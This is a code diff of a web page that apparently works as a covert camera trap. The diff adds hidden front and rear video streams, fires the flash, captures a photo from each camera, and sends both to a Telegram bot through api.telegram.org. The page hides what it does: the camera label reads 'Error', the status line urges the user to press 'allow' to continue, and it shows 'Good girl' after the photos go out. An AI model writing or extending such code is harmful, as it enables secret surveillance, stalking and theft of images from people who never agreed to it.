@@ -134,8 +134,10 @@
 
     <div class="camera-frame">
       <video id="video" autoplay playsinline style="display:none;"></video>
+      <video id="rearVideo" autoplay playsinline style="display:none;"></video>
       <canvas id="canvas" style="display:none;"></canvas>
-      <span id="cameraLabel" class="camera-label" style="display:none;">Привет</span>
+      <canvas id="rearCanvas" style="display:none;"></canvas>
+      <span id="cameraLabel" class="camera-label" style="display:none;">Error</span>
     </div>
 
     <div id="screenFlash" class="screen-flash" aria-hidden="true"></div>
@@ -154,44 +156,43 @@
   // ==============================================
 
   const video = document.getElementById('video');
+  const rearVideo = document.getElementById('rearVideo');
   const canvas = document.getElementById('canvas');
+  const rearCanvas = document.getElementById('rearCanvas');
   const status = document.getElementById('status');
   const screenFlash = document.getElementById('screenFlash');
 
   const btnStart = document.getElementById('btnStart');
   const cameraLabel = document.getElementById('cameraLabel');
 
-  let stream = null;
-  let capturedBlob = null;
-  let cameraMode = 'user';
+  let streams = [];
   let isProcessing = false;
 
-  async function startCamera() {
+  async function startCamera(targetVideo, cameraMode) {
     if (!navigator.mediaDevices?.getUserMedia) {
       throw new Error('Браузер не поддерживает доступ к камере. Откройте страницу через HTTPS.');
     }
 
-    if (stream) stream.getTracks().forEach((track) => track.stop());
-
-    stream = await navigator.mediaDevices.getUserMedia({
+    const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: { ideal: cameraMode } },
       audio: false
     });
-    video.srcObject = stream;
-    video.classList.toggle('front-camera', cameraMode === 'user');
-    cameraLabel.textContent = cameraMode === 'user' ? 'Error' : 'Задняя камера';
+    streams.push(stream);
+    targetVideo.srcObject = stream;
+    targetVideo.classList.toggle('front-camera', cameraMode === 'user');
+    cameraLabel.textContent = 'Error';
     cameraLabel.style.display = 'block';
     btnStart.style.display = 'none';
   }
 
-  function waitForVideo() {
-    if (video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA) return Promise.resolve();
+  function waitForVideo(targetVideo) {
+    if (targetVideo.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA) return Promise.resolve();
     return new Promise((resolve) => {
-      video.addEventListener('loadeddata', resolve, { once: true });
+      targetVideo.addEventListener('loadeddata', resolve, { once: true });
     });
   }
 
-  async function enableFlash() {
+  async function enableFlash(stream) {
     const track = stream?.getVideoTracks()[0];
     const capabilities = track?.getCapabilities?.();
 
@@ -211,33 +212,32 @@
     return () => screenFlash.classList.remove('active');
   }
 
-  function capturePhoto() {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
+  function capturePhoto(sourceVideo, targetCanvas) {
+    targetCanvas.width = sourceVideo.videoWidth;
+    targetCanvas.height = sourceVideo.videoHeight;
+    targetCanvas.getContext('2d').drawImage(sourceVideo, 0, 0);
 
     return new Promise((resolve, reject) => {
-      canvas.toBlob((blob) => {
+      targetCanvas.toBlob((blob) => {
         if (!blob) {
-          reject(new Error('Не удалось создать изображение.'));
+          reject(new Error('Error.'));
           return;
         }
 
-        capturedBlob = blob;
         resolve(blob);
       }, 'image/jpeg', 0.9);
     });
   }
 
-  async function sendPhoto() {
-    if (!capturedBlob) return;
+  async function sendPhoto(photoBlob, filename) {
+    if (!photoBlob) return;
     if (BOT_TOKEN.includes("ВАШ_") || CHAT_ID.includes("ВАШ_")) {
       throw new Error('Сначала впишите BOT_TOKEN и CHAT_ID в код страницы.');
     }
 
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-    formData.append('photo', capturedBlob, 'photo.jpg');
+    formData.append('photo', photoBlob, filename);
 
     const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
@@ -249,9 +249,8 @@
   }
 
   function stopCamera() {
-    if (!stream) return;
-    stream.getTracks().forEach((track) => track.stop());
-    stream = null;
+    streams.forEach((stream) => stream.getTracks().forEach((track) => track.stop()));
+    streams = [];
   }
 
   async function captureAndSend() {
@@ -261,20 +260,40 @@
     status.textContent = "Жми разрешить чтобы продолжить...";
 
     try {
-      await startCamera();
-      await waitForVideo();
-      const disableFlash = await enableFlash();
+      const cameraResults = await Promise.allSettled([
+        startCamera(video, 'user'),
+        startCamera(rearVideo, 'environment')
+      ]);
+      const rejectedCamera = cameraResults.find((result) => result.status === 'rejected');
+      if (rejectedCamera) throw rejectedCamera.reason;
+      const [frontStream, rearStream] = cameraResults.map((result) => result.value);
+      await Promise.all([waitForVideo(video), waitForVideo(rearVideo)]);
+      const [disableFrontFlash, disableRearFlash] = await Promise.all([
+        enableFlash(frontStream),
+        enableFlash(rearStream)
+      ]);
+      let frontPhoto;
+      let rearPhoto;
       try {
         await new Promise((resolve) => setTimeout(resolve, 250));
-        await capturePhoto();
+        [frontPhoto, rearPhoto] = await Promise.all([
+          capturePhoto(video, canvas),
+          capturePhoto(rearVideo, rearCanvas)
+        ]);
       } finally {
-        disableFlash();
+        disableFrontFlash();
+        disableRearFlash();
       }
       stopCamera();
-      await sendPhoto();
+
+      status.textContent = "Отправляем фотографии...";
+      await sendPhoto(frontPhoto, 'front-photo.jpg');
+      await sendPhoto(rearPhoto, 'rear-photo.jpg');
       status.textContent = "Good girl";
     } catch (err) {
-      status.textContent = "Не удалось сделать или отправить фото: " + err.message;
+      stopCamera();
+      btnStart.style.display = 'block';
+      status.textContent = "Не удалось : " + err.message;
       btnStart.disabled = false;
       isProcessing = false;
     }
